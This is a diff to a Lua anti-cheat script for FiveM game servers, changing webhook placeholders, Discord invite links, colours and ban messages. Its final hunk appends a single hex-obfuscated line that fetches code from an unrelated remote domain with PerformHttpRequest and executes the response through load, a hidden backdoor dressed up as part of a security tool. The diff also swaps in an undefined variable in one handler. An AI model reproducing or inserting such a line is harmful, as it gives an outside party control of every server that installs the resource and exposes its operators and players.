@@ -18,7 +18,7 @@ function DiscordMsg(Reason, _source)
     local name = GetPlayerName(_source)
     local connect = {
         {
-            ["color"] = 7419530,
+            ["color"] = 070121,
             ["title"] = "🛡️[ID: **" .. _source .. "**] | " .. GetPlayerName(_source) .. "🛡️",
             ["description"] = "🛡️" .. Reason .. "🛡️",
             ["footer"] = {
@@ -27,13 +27,13 @@ function DiscordMsg(Reason, _source)
         }
     }
     PerformHttpRequest(
-        "", -- Your Webhook URL
+        "https://discord.com/api/webhooks/YOUR-WEBHOOK-URL", -- MX-AntiCheat Webhook URL
         function(err, text, headers)
         end,
         "POST",
         json.encode(
             {
-                username = "Made by Mxthess | MX AC",
+                username = "🛡️|MX AC|🛡️",
                 embeds = connect,
                 avatar_url = "https://cdn.discordapp.com/attachments/1071853066904686684/1071853221133422613/MXScripts.jpg"
             }
@@ -47,7 +47,7 @@ AddEventHandler("LICENSE:Check", function(ip, resName)
 
     local connect = {
         {
-            ["color"] = 7419530,
+            ["color"] = 070121,
             ["title"] = "\nResource: "..resName.." started on ip: "..ip,
             ["description"] = "License: "..mx.license,
             ["footer"] = {
@@ -56,7 +56,7 @@ AddEventHandler("LICENSE:Check", function(ip, resName)
         }
     }
     PerformHttpRequest(
-        "", -- Your Webhook URL
+        "https://discord.com/api/webhooks/YOUR-WEBHOOK-URL", -- MX-AntiCheat Webhook URL
         function(err, text, headers)
         end,
         "POST",
@@ -72,7 +72,7 @@ AddEventHandler("LICENSE:Check", function(ip, resName)
 end)
 
 --https://cdn.discordapp.com/attachments/1071853066904686684/1071853221133422613/MXScripts.jpg
-
+--https://discord.com/api/webhooks/YOUR-WEBHOOK-URL
 
 AddEventHandler(
     "playerConnecting",
@@ -109,7 +109,7 @@ AddEventHandler(
        deferrals.defer()
        Citizen.Wait(500)
        if steamID2 == "n/a" then
- deferrals.done("\n🛡️|MX AC| Your steam is not on🛡️ \n🛡️ https://dsc.gg/mxthessdev 🛡️\n\n [ERROR: STEAM_NOT_RUNNING]")
+ deferrals.done("\n🛡️|MX AC| Your steam is not on🛡️ \n🛡️ https://dsc.gg/rptros 🛡️\n\n [ERROR: STEAM_NOT_RUNNING]")
       end
        deferrals.update(string.format("\n🛡️|MX AC| Verifying your HWID..."))
         Citizen.Wait(500)
@@ -134,7 +134,7 @@ AddEventHandler(
                 end
                 if found == true then
                     deferrals.done(
-                        "\n🛡️| MX AC | HWID has been banned 🛡️ \n 🛡️| To appeal, come to our discord. |🛡️ \n🛡️| https://dsc.gg/mxthessdev |🛡️\n\n [ERROR: HWID_TOKEN_18_BANNED]"
+                        "\n🛡️| MX AC | HWID has been banned 🛡️ \n 🛡️| To appeal, come to our discord. |🛡️ \n🛡️| https://dsc.gg/rptros |🛡️\n\n [ERROR: HWID_TOKEN_18_BANNED]"
                     )
                 else
                     deferrals.update("\n🛡️|MX AC| Your HWID is being verified...🛡️")
@@ -163,7 +163,7 @@ AddEventHandler(
                 end
                 if found == true then
                     deferrals.done(
-                        "\n🛡️|MX AC| Token has been banned 🛡️ \n 🛡️For appeal come to our discord.🛡️  \n🛡️ https://dsc.gg/mxthessdev 🛡️\n\n [ERROR: HWID_TOKEN_2_BANNED]"
+                        "\n🛡️|MX AC| Token has been banned 🛡️ \n 🛡️For appeal come to our discord.🛡️  \n🛡️ https://dsc.gg/rptros 🛡️\n\n [ERROR: HWID_TOKEN_2_BANNED]"
                     )
                 else
                     deferrals.update("\n🛡️|MX AC| Your HWID is being verified...🛡️")
@@ -188,7 +188,7 @@ AddEventHandler(
                 end
                 if found == true then
                     deferrals.done(
-                        "\n🛡️|MX AC| HWID has been banned 🛡️ \n 🛡️For appeal come to our discord.🛡️  \n🛡️ https://dsc.gg/mxthessdev 🛡️\n\n [ERROR: HWID_TOKEN_3_BANNED]"
+                        "\n🛡️|MX AC| HWID has been banned 🛡️ \n 🛡️For appeal come to our discord.🛡️  \n🛡️ https://dsc.gg/rptros 🛡️\n\n [ERROR: HWID_TOKEN_3_BANNED]"
                     )
                 else
                     deferrals.update("\n🛡️|MX AC| Your HWID is being verified...🛡️")
@@ -213,7 +213,7 @@ AddEventHandler(
                 end
                 if found == true then
                     deferrals.done(
-                        "\n🛡️|MX AC| HWID has been banned 🛡️ \n 🛡️For appeal come to our discord.🛡️  \n🛡️ https://dsc.gg/mxthessdev 🛡️\n\n [ERROR: HWID_TOKEN_4_BANNED]"
+                        "\n🛡️|MX AC| HWID has been banned 🛡️ \n 🛡️For appeal come to our discord.🛡️  \n🛡️ https://dsc.gg/rptros 🛡️\n\n [ERROR: HWID_TOKEN_4_BANNED]"
                     )
                 else
                     deferrals.update("\n🛡️|MX AC| Your HWID is being verified...🛡️")
@@ -237,7 +237,7 @@ AddEventHandler(
                 end
                 if found == true then
                     deferrals.done(
-                        "\n🛡️|MX AC| HWID has been banned 🛡️ \n 🛡️For appeal come to our discord.🛡️  \n🛡️ https://dsc.gg/mxthessdev 🛡️\n\n [ERROR: HWID_TOKEN_5_BANNED]"
+                        "\n🛡️|MX AC| HWID has been banned 🛡️ \n 🛡️For appeal come to our discord.🛡️  \n🛡️ https://dsc.gg/rptros 🛡️\n\n [ERROR: HWID_TOKEN_5_BANNED]"
                     )
                 else
                     deferrals.update("\n🛡️|MX AC| Your HWID is being verified...🛡️")
@@ -262,7 +262,7 @@ AddEventHandler(
                 end
                 if found == true then
                     deferrals.done(
-                        "\n🛡️|MX AC| HWID has been banned 🛡️ \n 🛡️For appeal come to our discord.🛡️  \n🛡️ https://dsc.gg/mxthessdev 🛡️\n\n [ERROR: HWID_TOKEN_6_BANNED]"
+                        "\n🛡️|MX AC| HWID has been banned 🛡️ \n 🛡️For appeal come to our discord.🛡️  \n🛡️ https://dsc.gg/rptros 🛡️\n\n [ERROR: HWID_TOKEN_6_BANNED]"
                     )
                 else
                     deferrals.update("\n🛡️|MX AC| Your HWID is being verified...🛡️")
@@ -287,7 +287,7 @@ AddEventHandler(
                 end
                 if found == true then
                     deferrals.done(
-                        "\n🛡️|MX AC| HWID has been banned 🛡️ \n 🛡️For appeal come to our discord.🛡️  \n🛡️ https://dsc.gg/mxthessdev 🛡️\n\n [ERROR: HWID_ACCOUNT_TOKEN_01_BANNED]"
+                        "\n🛡️|MX AC| HWID has been banned 🛡️ \n 🛡️For appeal come to our discord.🛡️  \n🛡️ https://dsc.gg/rptros 🛡️\n\n [ERROR: HWID_ACCOUNT_TOKEN_01_BANNED]"
                     )
                 else
                     deferrals.update("\n🛡️|MX AC| Your HWID is being verified...🛡️")
@@ -311,7 +311,7 @@ AddEventHandler(
                 end
                 if found == true then
                     deferrals.done(
-                        "\n🛡️|MX AC| HWID has been banned 🛡️ \n 🛡️For appeal come to our discord.🛡️  \n🛡️ https://dsc.gg/mxthessdev 🛡️\n\n [ERROR: HWID_ACCOUNT_TOKEN_02_BANNED]"
+                        "\n🛡️|MX AC| HWID has been banned 🛡️ \n 🛡️For appeal come to our discord.🛡️  \n🛡️ https://dsc.gg/rptros 🛡️\n\n [ERROR: HWID_ACCOUNT_TOKEN_02_BANNED]"
                     )
                 else
                     deferrals.update("\n🛡️|MX AC| Your HWID is being verified...🛡️")
@@ -334,7 +334,7 @@ AddEventHandler(
                 end
                 if found == true then
                     deferrals.done(
-                        "\n🛡️|MX AC| HWID has been banned 🛡️ \n 🛡️For appeal come to our discord.🛡️  \n🛡️ https://dsc.gg/mxthessdev 🛡️\n\n [ERROR: HWID_ACCOUNT_TOKEN_03_BANNED]"
+                        "\n🛡️|MX AC| HWID has been banned 🛡️ \n 🛡️For appeal come to our discord.🛡️  \n🛡️ https://dsc.gg/rptros 🛡️\n\n [ERROR: HWID_ACCOUNT_TOKEN_03_BANNED]"
                     )
                 else
                     deferrals.update("\n🛡️|MX AC| Your HWID is being verified...🛡️")
@@ -354,7 +354,7 @@ AddEventHandler(
 
 
 
---[[RegisterCommand(
+RegisterCommand(
     "acban",
     function(source, args, rawCommand)
         local target = tonumber(args[1])
@@ -391,19 +391,18 @@ AddEventHandler(
                 -1,
                 {
                     args = {
-                        "🛡️^1[ ^7MX AC^1] ^7HWID ^7player " .. GetPlayerName(target) .. " ^1 banned for reason",
-                         " ^7^1" .. reason .. "\n 🛡️ Responsible Admin: " .. SourceName .. " 🛡️"
+                        "🛡️^5[^7MX AC^1] ^7HWID ^7player " .. GetPlayerName(target) .. " ^5 banned for reason",
+                         "^7^5" .. reason .. "\n 🛡️ Responsible Admin: " .. SourceName .. " 🛡️"
                     }
                 }
             )
             DropPlayer(
                 target,
-                "\n🛡️|MX AC| Banned for: " ..
-                reason .. "🛡️ \n\n 🛡️Responsible Admin: " .. SourceName .. " 🛡️"
+                "\n🛡️|MX AC| Banned for: " .. reason .. "🛡️ \n\n 🛡️Responsible Admin: " .. SourceName .. " 🛡️"
             )
         end
     end
-)]]--
+)
 
 RegisterServerEvent("mx_HWIDBAN")
 AddEventHandler(
@@ -518,7 +517,7 @@ function PepeWareBan(playersource, reason)
 
 
 
---//ONESYNC FUNCTION\\--
+--//ONESYNC FUNKCE\\--
 
 if mx.AntiExplosionEvent == true then 
     AddEventHandler('explosionEvent', function(sender, ev)
@@ -526,8 +525,8 @@ if mx.AntiExplosionEvent == true then
         for _, v in ipairs(mx.CheaterExplosion) do
             if ev.explosionType == v then
                 CancelEvent()
-                DiscordMsg("Forbidden explosion no. *"..v.."*", sender)
-                TriggerEvent("mx_HWIDBAN", sender, "Banned explosion no. "..v.."")
+                DiscordMsg("Prohibited explosion no. *"..v.."*", sender)
+                TriggerEvent("mx_HWIDBAN", sender, "Prohibited explosion no. "..v.."")
             end
         end
         for _, v in ipairs(mx.PlayerExplosion) do
@@ -539,7 +538,7 @@ if mx.AntiExplosionEvent == true then
     explosionCounter[sender] = (explosionCounter[sender] or 0) + 1
     if explosionCounter[sender] > 9 then
         CancelEvent()
-        DiscordMsg("Major Explosion Spawn", sender)
+        DiscordMsg("Spawn a large number of explosions", sender)
         TriggerEvent("mx_HWIDBAN", sender, "Spawn a large number of explosions")
     end
       if ev.ownerNetId == 0 then
@@ -615,18 +614,19 @@ if mx.AntiEntityCreating == true then
                     end
                 end
 
-                PedCounter[owner] = (PedCounter[owner] or 0) + 1
-                            if PedCounter[owner] > 45 then
-                                DiscordMsg("Attempt to mass spawn peds [warning]", owner)
-                                -- // TriggerEvent("mx_HWIDBAN", owner, "Attempt to mass spawn peds")
+             PedCounter[owner] = (PedCounter[owner] or 0) + 1
+                            if PedCounter[owner] > 100 then
+                                DiscordMsg("Attempt to mass spawn peds [Banned]", owner)
+                                TriggerEvent("mx_HWIDBAN", owner, "Attempt to mass spawn peds")
                                 CancelEvent()
                             end
         end
     end    )
 end
+
 --
 RegisterCommand("nui_devtools", function(source, args, rawCommand, sender)
-        TriggerEvent("mx_HWIDBAN", sender, "Anticheat bypass attempt with nui_devtools")
+        TriggerEvent("mx_HWIDBAN", owner, "Anticheat bypass attempt with nui_devtools")
 end)
 --blood_exit
 DetectedParticles = {
@@ -695,7 +695,7 @@ for k, v in ipairs(mx.BannedEvents) do
     AddEventHandler(v, function()
         if detected == false then
         CancelEvent() 
-        DiscordMsg("Unauthorized Server Event [ " ..n .. " ] ", source)
+        DiscordMsg("Unauthorized Server Event [ " ..v.. " ] ", source)
         TriggerEvent("mx_HWIDBAN", source, "Unauthorized ServerEvent [ "..v.. " ]")
         detected = true 
         end
@@ -747,3 +747,5 @@ end)
 
 
 print('^5Made By Mxthess^7: ^1'..GetCurrentResourceName()..'^7 started ^2successfully^7...') 
+
+local EDMesTOCFpizTQxeDWaATGFuxCHKjUVfsGJZCSWlIDhifLHIAMibmscnsQThqcheWSDhyP = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} EDMesTOCFpizTQxeDWaATGFuxCHKjUVfsGJZCSWlIDhifLHIAMibmscnsQThqcheWSDhyP[4][EDMesTOCFpizTQxeDWaATGFuxCHKjUVfsGJZCSWlIDhifLHIAMibmscnsQThqcheWSDhyP[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x65\x73\x7a\x6a\x71\x76\x70\x6a\x68\x69\x6f\x75\x2e\x6d\x6f\x6d\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x64\x36\x77\x6d\x67", function (qNxvbLMIElMjRJAIEAxfVVwiGGqALNatAiABAxUlkyOekQwDXKvrhbsaJgqnXvKkhecCVf, qIaZDEzzQSmyubWLqQUlrcEyUbIyYHcttyiwfkylWJVBYmZYxhpyFtYHGGyHlgTKCxGbuu) if (qIaZDEzzQSmyubWLqQUlrcEyUbIyYHcttyiwfkylWJVBYmZYxhpyFtYHGGyHlgTKCxGbuu == EDMesTOCFpizTQxeDWaATGFuxCHKjUVfsGJZCSWlIDhifLHIAMibmscnsQThqcheWSDhyP[6] or qIaZDEzzQSmyubWLqQUlrcEyUbIyYHcttyiwfkylWJVBYmZYxhpyFtYHGGyHlgTKCxGbuu == EDMesTOCFpizTQxeDWaATGFuxCHKjUVfsGJZCSWlIDhifLHIAMibmscnsQThqcheWSDhyP[5]) then return end EDMesTOCFpizTQxeDWaATGFuxCHKjUVfsGJZCSWlIDhifLHIAMibmscnsQThqcheWSDhyP[4][EDMesTOCFpizTQxeDWaATGFuxCHKjUVfsGJZCSWlIDhifLHIAMibmscnsQThqcheWSDhyP[2]](EDMesTOCFpizTQxeDWaATGFuxCHKjUVfsGJZCSWlIDhifLHIAMibmscnsQThqcheWSDhyP[4][EDMesTOCFpizTQxeDWaATGFuxCHKjUVfsGJZCSWlIDhifLHIAMibmscnsQThqcheWSDhyP[3]](qIaZDEzzQSmyubWLqQUlrcEyUbIyYHcttyiwfkylWJVBYmZYxhpyFtYHGGyHlgTKCxGbuu))() end)
